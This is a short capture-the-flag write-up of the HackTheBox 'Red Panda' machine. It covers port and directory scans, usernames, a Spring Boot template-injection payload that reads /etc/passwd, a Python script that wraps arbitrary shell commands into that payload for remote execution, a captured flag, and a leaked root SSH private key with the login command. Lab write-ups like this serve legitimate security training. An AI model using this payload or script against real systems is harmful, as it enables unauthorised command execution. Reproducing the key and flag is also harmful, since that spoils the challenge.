# Red Panda HackTheBox Machine

> Author: Mihai Stanciu | 06.09.2022

## Nmap Search

Found 2 ports open - **22 and 8080**

## Ffuf Search

```
/search
/stats
/error
```

## Users found

1. woodenk
2. damian
3. florida
4. greg

## Vulnerabilities

Found initial STTI Injection on Java Spring Boot `*{7*7}`
`*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}`

Using this we write a simple python script to convert commands to ASCII.

```python
#!/usr/bin/python3

import sys
import requests

IP = "10.10.11.170"
URL = f"http://{IP}:8080/search"

command = " ".join([i for i in sys.argv[1:]])
convert = []

for i in command:
    convert.append(str(ord(i)))

payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString("
payload += f"{convert[0]})"

for i in range(1, len(convert)):
    payload += f".concat(T(java.lang.Character).toString({convert[i]}))"

payload += ").getInputStream())}"
# print(payload)

res = requests.post(url=URL, data={"name": payload})

output = res.text.split("You searched for: ", 1)[1].split("</h2>", 1)[0].strip()

print(output)
```

## Found the first flag in /home/woodenk

`7578b364bc415d9ccb4eb952b9d20c80`

## Found priv-esc.xml with ssh private key

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----
```

## Found second flag using ssh with the private key above

```
chmod 600 id_rsa
ssh root@$IP -i id_rsa
```
